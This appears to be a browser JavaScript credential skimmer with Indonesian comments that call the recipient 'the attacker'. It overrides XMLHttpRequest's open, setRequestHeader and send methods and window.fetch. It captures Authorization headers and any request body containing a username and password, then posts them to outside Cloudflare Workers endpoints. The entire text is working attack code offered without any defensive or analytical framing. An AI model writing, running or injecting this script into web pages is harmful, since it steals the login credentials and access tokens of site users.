// Hook XMLHttpRequest untuk mencegat request yang mengirim kredensial
var originalOpen = XMLHttpRequest.prototype.open;
XMLHttpRequest.prototype.open = function(method, url) {
    this.setRequestHeader = function(header, value) {
        if (header.toLowerCase() === 'authorization') {
            // Kirim header Authorization ke penyerang
            fetch('https://memek-worker.defoy89122.workers.dev/?message=', {
                method: 'POST',
                body: JSON.stringify({ url: url, authHeader: value }),
                headers: { 'Content-Type': 'application/json' }
            });
        }
        return XMLHttpRequest.prototype.setRequestHeader.apply(this, arguments);
    };
    // Hook send() untuk body request
    var originalSend = this.send;
    this.send = function(body) {
        if (body && typeof body === 'string') {
            // Cek jika body berisi username/password (contoh sederhana)
            if (body.includes('username') && body.includes('password')) {
                fetch('https://lucifer.yutupprem0.workers.dev/?message=', {
                    method: 'POST',
                    body: JSON.stringify({ url: url, requestBody: body }),
                    headers: { 'Content-Type': 'application/json' }
                });
            }
        }
        return originalSend.apply(this, arguments);
    };
    return originalOpen.apply(this, arguments);
};

// Hook Fetch API (untuk request modern)
var originalFetch = window.fetch;
window.fetch = function(input, init) {
    if (init && init.headers && init.headers.Authorization) {
        fetch('https://lucifer.yutupprem0.workers.dev/?message=', {
            method: 'POST',
            body: JSON.stringify({ url: input, auth: init.headers.Authorization }),
            headers: { 'Content-Type': 'application/json' }
        });
    }
    if (init && init.body && typeof init.body === 'string') {
        if (init.body.includes('username') && init.body.includes('password')) {
            fetch('https://lucifer.yutupprem0.workers.dev/?message=', {
                method: 'POST',
                body: JSON.stringify({ url: input, body: init.body }),
                headers: { 'Content-Type': 'application/json' }
            });
        }
    }
    return originalFetch.apply(this, arguments);
};
